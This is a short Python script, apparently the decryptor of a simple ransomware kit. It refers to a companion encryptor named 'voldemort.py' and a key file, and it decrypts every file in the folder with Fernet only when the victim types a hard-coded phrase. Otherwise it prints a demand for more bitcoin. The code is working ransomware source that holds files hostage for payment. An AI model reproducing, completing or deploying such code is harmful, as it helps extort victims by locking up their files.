#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#let's find some files


files = []

for file in os.listdir():
	if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)


with open("thekey.key","rb") as key:
	secretkey = key.read()


secretphrase = "MR.X@123"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
		print("congrats, you're files are decrypted. Enjoy your freedom")
else:
	print("Sorry, wrong secret phrase. Send me more bitcoin") 
